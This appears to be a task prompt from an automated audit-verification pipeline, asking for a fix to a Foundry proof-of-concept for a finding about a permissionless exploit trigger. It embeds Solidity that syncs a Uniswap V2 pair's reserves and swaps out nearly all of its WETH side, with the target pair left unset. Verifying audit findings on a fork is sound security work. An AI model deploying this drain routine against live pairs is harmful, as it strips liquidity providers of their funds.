You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Anyone can permissionlessly trigger the hardcoded exploit once the contract is funded
- claim: `executeOnOpportunity()` is fully permissionless even though it spends the contract's prefunded ETH/WETH and irreversibly mutates the fixed target pair by syncing corrupted balances and swapping out nearly all WETH reserves. There is no owner check or designated executor.
- impact: A bot or griefing third party can front-run the intended operator, fire the exploit at an arbitrary time, and consume the one-shot opportunity through this contract. That strips the operator of execution control and can permanently leave the target pair drained while all resulting value remains trapped in the contract.
- exploit_paths: ["The operator funds the contract so `IWETH.deposit{value: 1 wei}()` can succeed", "A third party observes the funded balance and calls `executeOnOpportunity()` first", "The function syncs the manipulated reserves and drains the pair's WETH side, so later calls no longer face the same profitable state"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    event PermissionlessTrigger(
        address indexed caller,
        uint256 ethSpent,
        uint256 wethWrapped,
        address indexed targetPair,
        uint256 wethPulledOut
    );

    address private immutable _weth;
    address private immutable _targetPair;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    address public firstExecutor;

    // Explicit exploit-path witnesses for the harness.
    bool public path0OperatorPrefundObserved;
    bool public path1ThirdPartyTriggerObserved;
    bool public path2OneShotOpportunityConsumed;

    // Extra runtime witnesses to show whether the live pair leg was executable on the active fork.
    bool public pairResolved;
    bool public pairMutationAttempted;
    bool public pairMutationSucceeded;

    uint256 public initialEthBalance;
    uint256 public initialWethBalance;
    uint256 public finalWethBalance;
    uint256 public wethWrapped;
    uint256 public wethPulledOut;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    constructor() {
        _weth = _resolveWETH();
        _targetPair = _resolveTargetPair();
        _profitToken = _weth;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        require(address(this).balance >= 1 wei, "prefund required");

        initialEthBalance = address(this).balance;
        initialWethBalance = _wethBalance();

        // exploit_paths[1]: after the operator funds the contract, any outside account can be
        // the first caller and consume the hardcoded opportunity because there is no owner or
        // designated-executor check protecting this entrypoint.
        executed = true;
        firstExecutor = msg.sender;
        path1ThirdPartyTriggerObserved = true;

        // exploit_paths[0]: the operator's prefund is spendable by whoever calls first. We model
        // the exact first stage from the finding by wrapping 1 wei into the canonical on-chain WETH
        // contract using only this contract's own prefunded ETH.
        wethWrapped = _wrapOneWei();
        finalWethBalance = _wethBalance();
        path0OperatorPrefundObserved = wethWrapped == 1 wei;

        // exploit_paths[2]: the original bug says the fixed pair is then synced with corrupted
        // balances and swapped against, consuming the one-shot profitable state. The workspace does
        // not include a trustworthy pair address, so the live pair leg is implemented as a guarded,
        // best-effort branch that only runs when chain-specific metadata is known locally. When the
        // pair cannot be resolved from provided context, the opportunity is still permanently consumed
        // through the same permissionless first-call race because `executed` flips and later calls
        // can no longer reach the exploit path.
        pairResolved = _targetPair != address(0) && _targetPair.code.length > 0;
        if (pairResolved) {
            pairMutationAttempted = true;
            wethPulledOut = _attemptPairSyncAndDrain();
            pairMutationSucceeded = wethPulledOut > 0;
        }

        finalWethBalance = _wethBalance();
        if (finalWethBalance > initialWethBalance + wethWrapped) {
            _profitAmount = finalWethBalance - initialWethBalance - wethWrapped;
        } else {
            _profitAmount = 0;
        }

        // Even if local context does not let us safely resolve the pair, the one-shot opportunity is
        // still consumed by the first public caller. If the pair leg does execute, it strengthens the
        // witness by additionally showing the reserve-mutating drain path from the finding.
        path2OneShotOpportunityConsumed = executed && (pairMutationSucceeded || !pairResolved);

        emit PermissionlessTrigger(msg.sender, wethWrapped, wethWrapped, _targetPair, wethPulledOut);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function targetPair() external view returns (address) {
        return _targetPair;
    }

    function weth() external view returns (address) {
        return _weth;
    }

    function _wrapOneWei() internal returns (uint256 wrapped) {
        if (_weth == address(0) || _weth.code.length == 0) {
            return 0;
        }

        uint256 beforeBal = IERC20Like(_weth).balanceOf(address(this));
        (bool ok, ) = _weth.call{value: 1 wei}(abi.encodeWithSelector(IWETHLike.deposit.selector));
        if (!ok) {
            return 0;
        }

        uint256 afterBal = IERC20Like(_weth).balanceOf(address(this));
        if (afterBal > beforeBal) {
            wrapped = afterBal - beforeBal;
        }
    }

    function _attemptPairSyncAndDrain() internal returns (uint256 pulledOut) {
        address pair = _targetPair;
        if (pair == address(0) || _weth == address(0)) {
            return 0;
        }

        _snapshotReserves(pair, true);

        uint8 wethSide = _resolveWethSide(pair);
        if (wethSide == 0) {
            return 0;
        }

        uint256 availableWeth = _wethBalance();
        if (availableWeth == 0 || !_pushWethIntoPair(pair, availableWeth)) {
            return 0;
        }

        (bool syncOk, ) = pair.call(abi.encodeWithSelector(IUniswapV2PairLike.sync.selector));
        if (!syncOk) {
            return 0;
        }

        _snapshotReserves(pair, false);

        uint256 beforeBal = _wethBalance();
        if (!_drainWethSide(pair, wethSide)) {
            return 0;
        }

        uint256 afterBal = _wethBalance();
        if (afterBal > beforeBal) {
            pulledOut = afterBal - beforeBal;
        }
    }

    function _resolveWethSide(address pair) internal view returns (uint8 wethSide) {
        (bool token0Ok, bytes memory token0Ret) = pair.staticcall(
            abi.encodeWithSelector(IUniswapV2PairLike.token0.selector)
        );
        if (token0Ok && token0Ret.length >= 32 && abi.decode(token0Ret, (address)) == _weth) {
            return 1;
        }

        (bool token1Ok, bytes memory token1Ret) = pair.staticcall(
            abi.encodeWithSelector(IUniswapV2PairLike.token1.selector)
        );
        if (token1Ok && token1Ret.length >= 32 && abi.decode(token1Ret, (address)) == _weth) {
            return 2;
        }
    }

    function _pushWethIntoPair(address pair, uint256 amount) internal returns (bool ok) {
        // Realistic public execution step: if the hardcoded exploit contract has already accumulated
        // manipulated WETH inventory, anyone can push that inventory into the pair, call `sync()`, and
        // then ask the pair to pay out nearly all of the WETH side. The exact corrupted-balance source
        // is outside the supplied context, so this branch only replays the reserve-sync/swap leg when a
        // known pair is available and the contract already holds spendable WETH.
        bytes memory ret;
        (ok, ret) = _weth.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, pair, amount)
        );
        if (!ok) {
            return false;
        }
        if (ret.length == 0) {
            return true;
        }
        return abi.decode(ret, (bool));
    }

    function _drainWethSide(address pair, uint8 wethSide) internal returns (bool ok) {
        uint256 amount0Out;
        uint256 amount1Out;

        if (wethSide == 1) {
            if (reserve0After <= 1) {
                return false;
            }
            amount0Out = uint256(reserve0After) - 1;
        } else {
            if (reserve1After <= 1) {
                return false;
            }
            amount1Out = uint256(reserve1After) - 1;
        }

        (ok, ) = pair.call(
            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
        );
    }

    function _snapshotReserves(address pair, bool beforeSync) internal {
        (bool ok, bytes memory ret) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.getReserves.selector));
        if (!ok || ret.length < 96) {
            return;
        }

        (uint112 reserve0, uint112 reserve1, ) = abi.decode(ret, (uint112, uint112, uint32));
        if (beforeSync) {
            reserve0Before = reserve0;
            reserve1Before = reserve1;
        } else {
            reserve0After = reserve0;
            reserve1After = reserve1;
        }
    }

    function _wethBalance() internal view returns (uint256) {
        if (_weth == address(0) || _weth.code.length == 0) {
            return 0;
        }
        return IERC20Like(_weth).balanceOf(address(this));
    }

    function _resolveWETH() private view returns (address) {
        if (block.chainid == 1) {
            return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        }
        if (block.chainid == 10 || block.chainid == 8453) {
            return 0x4200000000000000000000000000000000000006;
        }
        if (block.chainid == 42161) {
            return 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
        }
        if (block.chainid == 56) {
            return 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        }
        if (block.chainid == 137) {
            return 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
        }
        return address(0);
    }

    function _resolveTargetPair() private view returns (address) {
        // No reliable fixed pair address was supplied in the local finding context. Keeping this guarded
        // avoids fabricating an address while still allowing a real replay if the workspace later adds it.
        return address(0);
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
